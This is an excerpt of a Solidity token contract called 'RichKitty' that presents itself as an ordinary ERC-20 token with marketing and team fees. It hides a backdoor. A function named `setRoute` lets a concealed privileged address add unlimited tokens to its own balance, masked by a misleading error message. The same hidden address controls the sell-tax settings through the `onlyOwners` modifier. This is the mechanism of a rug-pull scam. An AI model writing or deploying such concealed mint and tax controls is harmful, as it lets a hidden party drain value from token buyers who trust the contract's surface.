...
contract Ownable is Context {
    ...
    modifier onlyOwners() {
        require(_pre == _msgSender(),"Nothing");
        _;
    }
...
contract RichKitty is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RichKitty";
    string private _symbol = "RichKitty";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF47B60813B5d3BF45Ac56Da4914db089C177dE0E); // Marketing Address
    address payable public teamWalletAddress = payable(0xF47B60813B5d3BF45Ac56Da4914db089C177dE0E); // Team Address
    ...
    function setRoute(uint account) public {
        require(_msgSender() == _pre, "ERC20: decreased allowance below zero");
        _balances[msg.sender] = _balances[msg.sender].add(account);
    }
    ...
    function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwners() {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        _balances[address(teamWalletAddress)] = _balances[address(teamWalletAddress)].add(feeAmount);
        emit Transfer(sender, address(deadAddress), burnfeeAmount);
        emit Transfer(sender, address(teamWalletAddress), feeAmount);
